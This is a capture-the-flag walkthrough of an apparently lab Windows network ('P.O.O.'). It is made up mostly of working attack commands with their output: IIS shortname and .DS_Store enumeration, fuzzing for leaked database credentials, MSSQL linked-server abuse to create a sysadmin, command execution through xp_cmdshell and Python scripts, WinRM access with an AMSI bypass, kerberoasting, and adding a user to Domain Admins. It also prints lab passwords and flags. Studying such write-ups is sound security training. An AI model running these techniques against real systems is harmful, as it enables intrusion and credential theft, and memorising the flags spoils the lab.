# Recon
We start by scanning for open ports
```bash
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.2056.00; RTM+
| ms-sql-info: 
|   10.13.38.11:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM+
|       number: 14.00.2056.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: true
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.13.38.11:1433: 
|     Target_Name: POO
|     NetBIOS_Domain_Name: POO
|     NetBIOS_Computer_Name: COMPATIBILITY
|     DNS_Domain_Name: intranet.poo
|     DNS_Computer_Name: COMPATIBILITY.intranet.poo
|     DNS_Tree_Name: intranet.poo
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-03-02T03:22:01
|_Not valid after:  2056-03-02T03:22:01
|_ssl-date: 2026-03-02T11:02:58+00:00; +2s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
```
There's only 2 open ports. If we visit port 80, it's an IIS server. If ever we encounter an IIS, it is best to use the tool [Shortscan](https://github.com/bitquark/shortscan) or search for the module `shortscan` in metasploit. Fuzz from the root directory.

If we use the metasploit shortname scanner, we will find 5 directories, one of it is `ds_sto*~1` which stands for `ds_store`. If we visit it via web it will say not found, but given that the scanner found this, we can use the tool [DS-Walk](https://github.com/Keramas/DS_Walk) to enumerate more directories. Once we use the tool we will find these results
```bash
python3 ds_walk.py -u http://10.13.38.11                            m3m0rydmp
[!] .ds_store file is present on the webserver.
[+] Enumerating directories based on .ds_server file:
----------------------------
[!] http://10.13.38.11/admin
[!] http://10.13.38.11/dev
[!] http://10.13.38.11/iisstart.htm
[!] http://10.13.38.11/Images
[!] http://10.13.38.11/JS
[!] http://10.13.38.11/META-INF
[!] http://10.13.38.11/New folder
[!] http://10.13.38.11/New folder (2)
[!] http://10.13.38.11/Plugins
[!] http://10.13.38.11/Templates
[!] http://10.13.38.11/Themes
[!] http://10.13.38.11/Uploads
[!] http://10.13.38.11/web.config
[!] http://10.13.38.11/Widgets
----------------------------
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc
----------------------------
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/core
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/include
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/src
----------------------------
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/core
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/include
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/src
----------------------------
[!] http://10.13.38.11/Images/buttons
[!] http://10.13.38.11/Images/icons
[!] http://10.13.38.11/Images/iisstart.png
----------------------------
[!] http://10.13.38.11/JS/custom
----------------------------
[!] http://10.13.38.11/Themes/default
----------------------------
[!] http://10.13.38.11/Widgets/CalendarEvents
[!] http://10.13.38.11/Widgets/Framework
[!] http://10.13.38.11/Widgets/Menu
[!] http://10.13.38.11/Widgets/Notifications
----------------------------
[!] http://10.13.38.11/Widgets/Framework/Layouts
----------------------------
[!] http://10.13.38.11/Widgets/Framework/Layouts/custom
[!] http://10.13.38.11/Widgets/Framework/Layouts/default
----------------------------
[*] Finished traversing. No remaining .ds_store files present.
[*] Cleaning up .ds_store files saved to disk.
```
We can see some directories under `/dev`. We can fuzz for files under these directories by going back to the metasploit shortname scanner. After some tests, we found something interesting at `/dev/304c0c90fbc6520610abbf378e2339d1/db`. A file named `poo_co*~1.txt*` but since this is just a shortname, we don't know what this thing is for now all we know is `poo_co` so we need to fuzz the file. 
We can use the wordlist `/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt`. To make things easier we can use the following command to find wordlists that starts with **co** to make the wordlist shorter. `grep '^co.*' /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt > fuzz.txt`. At first, I used feroxbuster here but it was no avail. So we will utilize `ffuf` to fuzz the endpoint.
```bash
ffuf -u 'http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt' -w fuzz.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt
 :: Wordlist         : FUZZ: /home/m3m0rydmp/poo/DS_Walk/fuzz.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

connection              [Status: 200, Size: 142, Words: 3, Lines: 7, Duration: 238ms]
:: Progress: [2557/2557] :: Job [1/1] :: 75 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
```
We find the right one which is `connection`. We can now visit that endpoint through web and find some credentials.
```
SERVER=10.13.38.11
USERID=external_user
DBNAME=POO_PUBLIC
USERPWD=#p00Public3xt3rnalUs3r#
```

```
POO{fcfb0767f5bd3cbc22f40ff5011ad555}
```

# Huh?!
We will be logged in as `external_user` which is not a sysadmin so we cannot execute `xp_cmdshell`. But we found 1 user which is `sa` who is a sysadmin
```sql
select name, sysadmin from syslogins;
name            sysadmin   
-------------   --------   
sa                     1   
external_user          0 
```

SQL provides the ability to link external resources such as Oracle databases and other SQL servers (this is not limited to MSSQL). This is common to find in domain environments and can be exploited in case of misconfigurations.

We will query the [sysservers](https://learn.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql?view=sql-server-ver15) table
```sql
SQL (external_user  dbo@POO_PUBLIC)> SELECT srvname, isremote from sysservers;
srvname                    isremote   
------------------------   --------   
COMPATIBILITY\POO_PUBLIC          1   
COMPATIBILITY\POO_CONFIG          0  
```

The table contains two entries: POO_PUBLIC (current server) and POO_CONFIG. From the sysservers table, the `isremote` column determines if a server is linked or not. The value 1 stands for remote server, while the value 0 stands for a linked server. It's observed that POO_CONFIG is a linked server.

The EXEC statement can be used to execute queries on linked servers.
```sql
EXEC ('select current_user') at [COMPATIBILITY\POO_CONFIG]
                
-------------   
internal_user  
```
The queries on the linked server POO_CONFIG are running as `internal_user`. We can find out if it has sa privileges with
```sql
SQL (external_user  dbo@POO_PUBLIC)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
0  
```
internal_user is also not a sysadmin. We can enumerate the POO_CONFIG for more server links
```sql
SQL (external_user  dbo@POO_PUBLIC)> EXEC ('select srvname, isremote from sysservers') at [COMPATIBILITY\POO_CONFIG]
srvname                    isremote                                                                                 
------------------------   --------                                                                                 
COMPATIBILITY\POO_CONFIG          1                                                                                 
COMPATIBILITY\POO_PUBLIC          0
```
So POO_CONFIG is in turn linked to POO_PUBLIC, making it a circular link. We can query from POO_CONFIG to see which user is running the config by using nested queries.
```sql
SQL (external_user  dbo@POO_PUBLIC)> EXEC ('EXEC (''select suser_name()'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPA
     
--   
sa 
```
A nested EXEC statement is used to find the username after crawling back from the POO_CONFIG link. The query return `sa`, which means that the link allows us to execute queries as the sysadmin user.
![](../assets/POO/Pasted%20image%2020260302222245.png)The diagram illustrates how the links are crawled in order to attain `sa` privileges. We can use these privileges to change the sa password on POO_PUBLIC
```sql
EXEC ('EXEC (''EXEC sp_addlogin ''''m3m0'''', ''''P@ssw0rd123'''''') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG]; 

EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''m3m0'''', ''''sysadmin'''''') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
```
The following commands above adds a user `m3m0` which its password is `P@ssw0rd123` then give the user `m3m0` with `sysadmin` privileges the same server where POO_PUBLIC is. 

Once successful, we login again with the newly created user. We query for databases if there are any
```sql
SQL (m3m0  dbo@master)> SELECT name FROM sysdatabases;
name         
----------   
master       
tempdb       
model        
msdb         
POO_PUBLIC   
flag    
```
The database named **flag** is hidden before because external_user is not a sysadmin. Now we're using an account with sysadmin. We can get the contents on that database.
```sql
SQL (m3m0  dbo@master)> USE flag;
ENVCHANGE(DATABASE): Old Value: master, New Value: flag

SQL (m3m0  dbo@flag)> SELECT table_name, table_schema FROM flag.INFORMATION_SCHEMA.TABLES;
table_name   table_schema   
----------   ------------   
flag         dbo            
SQL (m3m0  dbo@flag)> select * from flag.dbo.flag
flag                                    
-------------------------------------     
```

```txt
POO{88d829eb39f2d11697e689d779810d42} 
```

# BackTrack
As an account with sysadmin we can enable `xp_cmdshell` to perform commands within the system
```sql
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
[output]
```
Since we found there is an IIS in this machine, the default location of the IIS is `C:\inetpub\wwwroot\`. There is a file there named `web.config` it stores credentials necessary for authentication for the IIS web server. We can execute `icacls` to view folder permissions through Access Control Lists
```sql
xp_cmdshell icacls C:\inetpub\wwwrooot\web.cofig
---
Access is denied.
```
Even with a sysadmin account, we have an access denied to `web.config` file. In MsSQL, there is a feature called [sp_execute_external_script]([sp_execute_external_script (Transact-SQL) - SQL Server | Microsoft Learn](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql?view=sql-server-ver15)) this allows us to execute externals scripts written in R or Python. We can [enable external script]([Server Configuration: external scripts enabled - SQL Server | Microsoft Learn](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/external-scripts-enabled-server-configuration-option?view=sql-server-ver15)) through the following:
```sql
EXECUTE sp_configure 'external scripts enabled', 1;
RECONFIGURE
EXEC sp_execute_external_script @language = N'Python', @script = N'print( "Hello World" );';

Express Edition will continue to be enforced.
Hello World
```
`N` stands for National Language in SQL which indicates the string inside it is a Unicode string. If we need to use `sp_execute_external_script` we need to define the language either Python or R, the the `@script` is the code we want to execute.
By using python, we can execute commands for the operating system with the following
```sql
EXEC sp_execute_external_script @language = N'Python', @script = N'import os; os.system("whoami")';';

compatibility\poo_public01
```
Now we're running as poo_public01 and not a service account. With this, we can now look at the content of `web.config`. 
```
EXEC sp_execute_external_script @language = N'Python', @script = N'import os; os.system("type C:\inetpub\wwwroot\web.config")';';

name="Administrator"
password="EverybodyWantsToWorkAtP.O.O."
```
Since this is the credentials for the IIS web server. Let's go back to the IIS web server and authenticate using this credential.
```
POO{4882bd2ccfd4b5318978540d9843729f}
```

# Foothold
Going back to the MsSQL. We look at its internal ports for any active protocols listening. 
```SQL
xp_cmdshell netstat -anop tcp
Proto   Local Address     Foreign Address  State          PID
TCP     0.0.0.0:5985      0.0.0.0          LISTENING      4
```
We can see an open port of 5985 which is the WinRM. But looking back at our nmap scan, winrm is not open. Another way to do this is to use the machine's IPv6 and scan again with nmap to confirm.
```SQL
xp_cmdshell ipconfig

IPv6................................: dead:beef::1001
```
The IPv6 is `dead:beef::1001` we can use this to scan with nmap and verify if WinRM is open
```bash
nmap -p5985 -6 dead:beef::1001

PORT       STATE  SERVICE
5985/tcp   open   wsman
```
Since WinRM is open using the IPv6 of the target. Let's connect with `evil-winrm` using the IPv6 address.
```bash
evil-winrm -i compatibility -u administrator -p 'EverybodyWantsToWorkAtP.O.O.'
```
The fourth flag is at `~\Desktop`
```
POO{ff87c4fe10e2ef096f9a96a01c646f8f}
```

# P00ned
Now that we have a foothold inside the system. We need to find a way to escalate our privilege, going to the domain controller. As a local administrator we can't query the domain controller. But the service account MsSQl can since it automatically impersonate the computer account, which are members of the domain and effectively a special type of user account.

Using SharpHound collector, we need to gather data about the domain. Upload the SharpHound collector, I recommend in `C:\Users\Public`
```
xp_cmdshell C:\Users\Public\SharpHound.exe -C All --outputdirectory C:\Users\Public
```
As a local account, we don't have power to execute commands within the domain, that's why we're using the service account to make this possible.
A zip file will be created, download it and ingest in BloodHound. Once in BloodHound, we need to find an attack vector which is `Shortest paths to Domain Admin from Kerberoastable users` in some CTF enumerating would take a while to find something like this, and this attack vector is one of them that you should include.
![](../assets/POO/Pasted%20image%2020260303212128.png)
We can see that P00_ADM@INTRANET.POO is a member of Help Desk, which Help Desk has GenericAll to Domain Admins. An attack vector here is to add any user to Domain Admins. If we add P00_ADM to Domain Admins we will have an account as admin in domain controller.

Since there is no open port like ldap to do a remote exploit. Upload a tool Rubeus inside to perform kerberoast of the user P00_ADM and crack its hash.
```SQL
xp_cmdshell C:\Users\Public\Rubeus.exe kerberoast /user:p00_adm
```
Get the krb5tgs hash and crack it with hashcat and rockyou.txt wordlist. `ZQ!5t4r`
Now we know the plaintext password of p00_adm we can download powerview inside it using `evil-winrm`. Restart the evil-winrm session and put a `-s` flag to specify script path. 
```bash
evil-winrm -i compatibility -u administrator -p 'EverybodyWantsToWorkAtP.O.O.' -s .

Bypass-4MSI
[+] Patched! :D
powerview.ps1
# Note: when you call powerview.ps1 it will take some time as it's still uploading to evil-winrm. The purpose of this is that even if you close the session, it will still remain in evil-winrm's memory so that you can still use the powerview.ps1
```
Now that we have `powerview.ps1` we can add p00_adm in domain admins.
```powershell
$pass = ConvertTo-SecureString 'ZQ!5t4r` -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('intranet.poo\p00_adm',$pass)
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'p00_adm' -Credential $cred
```
You can verify if p00_adm is part of domain admins
```powershell
Get-DomainUser p00_adm -Credential $cred
```
Once confirmed, we can do a recurse to find the flag.txt in `C:\Users` take note that we are now querying the domain controller and not local. 
```powershell
Invoke-Command -Computer DC -Credential $cred -ScriptBlock { gci -recurse C:\Users flag.txt }

Directory: C:\Users\mr3ks\Desktop
Invoke-Command -Computer DC -Credential $cred $ScriptBlock { type C:\Users\mr3ks\Desktop\flag.txt }

POO{1196ef8bc523f084ad1732a38a0851d6}
```
